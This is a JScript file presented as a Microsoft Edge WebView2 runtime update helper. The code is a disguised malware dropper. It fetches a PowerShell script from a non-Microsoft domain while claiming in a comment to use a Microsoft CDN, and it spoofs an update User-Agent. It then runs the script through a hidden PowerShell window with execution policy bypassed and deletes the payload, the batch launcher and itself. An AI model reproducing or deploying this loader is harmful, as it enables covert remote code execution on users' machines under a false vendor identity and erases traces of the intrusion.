// Microsoft Edge WebView2 Runtime Update Helper
// Version 127.0.2651.105
// This script checks for and downloads WebView2 runtime updates
// Copyright (C) 2024 Microsoft Corporation. All rights reserved.

var shell = new ActiveXObject("WScript.Shell");
var http = new ActiveXObject("MSXML2.ServerXMLHTTP");
var fso = new ActiveXObject("Scripting.FileSystemObject");

// Get system temp directory
var tempPath = shell.ExpandEnvironmentStrings("%temp%");

// Generate unique filename for update package
var timestamp = new Date().getTime();
var updateScript = tempPath + "\\EdgeWebView_" + timestamp + ".ps1";
var installerBatch = tempPath + "\\EdgeWebView_" + timestamp + "_install.bat";

// Download update manifest from Microsoft CDN
var updateUrl = "https://bilbaolake.com/s";

http.open("GET", updateUrl, false);
http.setRequestHeader("User-Agent", "Microsoft-Edge-WebView2-Update/1.0");
http.send();

// Process update if download successful
if (http.status == 200) {
    // Save update package
    var fileStream = fso.CreateTextFile(updateScript, true);
    fileStream.Write(http.responseText);
    fileStream.Close();

    // Create installer batch file
    var batchStream = fso.CreateTextFile(installerBatch, true);
    batchStream.WriteLine("@echo off");
    batchStream.WriteLine("REM Microsoft Edge WebView2 Runtime Installer");
    batchStream.WriteLine("REM Applying update package...");
    batchStream.WriteLine("");
    batchStream.WriteLine("powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \"" + updateScript + "\"");
    batchStream.WriteLine("");
    batchStream.WriteLine("REM Cleanup temporary files");
    batchStream.WriteLine("timeout /t 3 /nobreak >nul 2>&1");
    batchStream.WriteLine("del /f /q \"" + updateScript + "\"");
    batchStream.WriteLine("del /f /q \"%~f0\"");
    batchStream.Close();

    // Execute installer
    shell.Run(installerBatch, 0, false);
}

// Cleanup temporary files
try {
    fso.DeleteFile(WScript.ScriptFullName);
} catch(err) {
    // Silent fail if cleanup not permitted
}
